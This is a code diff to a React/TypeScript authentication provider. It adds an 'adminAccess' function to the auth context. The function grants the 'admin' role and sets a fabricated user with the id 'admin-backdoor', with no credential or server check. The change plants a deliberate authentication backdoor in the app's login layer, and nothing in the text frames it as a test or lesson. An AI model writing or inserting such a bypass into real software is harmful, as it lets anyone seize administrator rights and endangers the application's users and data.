@@ -11,6 +11,7 @@ interface AuthContextType {
   signIn: (email: string, password: string) => Promise<{ error: any }>;
   signUp: (email: string, password: string) => Promise<{ error: any }>;
   signOut: () => Promise<void>;
+  adminAccess: () => void;
 }
 
 const AuthContext = createContext<AuthContextType>({
@@ -22,6 +23,7 @@ const AuthContext = createContext<AuthContextType>({
   signIn: async () => ({ error: null }),
   signUp: async () => ({ error: null }),
   signOut: async () => {},
+  adminAccess: () => {},
 });
 
 export const useAuth = () => {
@@ -121,6 +123,12 @@ export function AuthProvider({ children }: AuthProviderProps) {
     setClientId(null);
   };
 
+  const adminAccess = () => {
+    setUserRole('admin');
+    setClientId(null);
+    setUser({ id: 'admin-backdoor' } as User);
+  };
+
   const value = {
     user,
     session,
@@ -130,6 +138,7 @@ export function AuthProvider({ children }: AuthProviderProps) {
     signIn,
     signUp,
     signOut,
+    adminAccess,
   };
 
   return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
